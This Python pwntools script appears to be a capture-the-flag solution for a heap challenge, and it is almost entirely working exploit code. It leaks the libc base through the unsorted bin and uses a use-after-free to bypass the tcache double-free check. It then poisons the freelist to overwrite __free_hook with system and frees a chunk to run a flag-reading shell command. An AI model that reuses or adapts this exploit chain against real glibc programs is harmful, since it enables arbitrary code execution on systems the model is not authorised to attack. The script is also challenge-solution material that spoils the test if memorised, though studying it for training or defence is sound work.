#!/usr/bin/env python3
from pwn import *
import re

context.binary = ELF('./main', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

LD = './ld.so.2'
HOST = 'chall.k1nd4sus.it'
PORT = 30500

# For glibc 2.31, unsorted-bin fd leak gives main_arena+0x60.
UNSORTED_FD_OFFSET = 0x1ECBE0
FLAG_RE = re.compile(rb'KSUS\{[^\n}]*\}')


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process([LD, '--library-path', '.', './main'])


class MenuApp:
    def __init__(self, io):
        self.io = io
        self.sizes = {}

    def choose(self, item: int):
        self.io.sendlineafter(b'> ', str(item).encode())

    def alloc(self, size: int) -> int:
        self.choose(1)
        self.io.sendlineafter(b'Size: ', str(size).encode())
        line = self.io.recvline_contains(b'Chunk')
        idx = int(line.split()[1])
        self.sizes[idx] = size
        return idx

    def edit(self, idx: int, data: bytes):
        self.choose(2)
        self.io.sendlineafter(b'Index: ', str(idx).encode())
        self.io.sendafter(b'Data: ', data.ljust(self.sizes[idx], b'\x00'))

    def view(self, idx: int) -> bytes:
        self.choose(3)
        self.io.sendlineafter(b'Index: ', str(idx).encode())
        return self.io.recvline().rstrip(b'\n')

    def free(self, idx: int):
        self.choose(4)
        self.io.sendlineafter(b'Index: ', str(idx).encode())


def exploit(io):
    app = MenuApp(io)

    # 1) Leak libc from unsorted bin.
    large = app.alloc(0x500)
    _guard = app.alloc(0x20)
    app.free(large)
    leak = u64(app.view(large).ljust(8, b'\x00'))
    libc.address = leak - UNSORTED_FD_OFFSET
    log.success(f'unsorted leak = {hex(leak)}')
    log.success(f'libc base     = {hex(libc.address)}')

    # 2) Build tcache dup on 0x90-sized chunks.
    a = app.alloc(0x80)
    b = app.alloc(0x80)
    app.free(a)
    app.free(b)

    # UAF write clears tcache key so freeing a again bypasses check.
    app.edit(a, p64(0) + p64(0))
    app.free(a)

    # 3) Poison the freelist by editing freed chunk b.
    target = libc.sym.__free_hook - 8
    app.edit(b, p64(target))

    app.alloc(0x80)          # returns a
    app.alloc(0x80)          # returns b
    hook_chunk = app.alloc(0x80)  # returns __free_hook-8

    # Write system to __free_hook.
    app.edit(hook_chunk, p64(0) + p64(libc.sym.system))

    # 4) Trigger system("cat ...") through free().
    cmd = app.alloc(0x80)
    app.edit(cmd, b'cat /app/flag.txt || cat flag.txt || cat /srv/app/flag.txt\x00')
    app.free(cmd)


def main():
    io = start()
    exploit(io)

    out = io.recvrepeat(2)
    m = FLAG_RE.search(out)
    if m:
        print(m.group(0).decode())
    else:
        print(out.decode('latin-1', errors='ignore'))


if __name__ == '__main__':
    main()
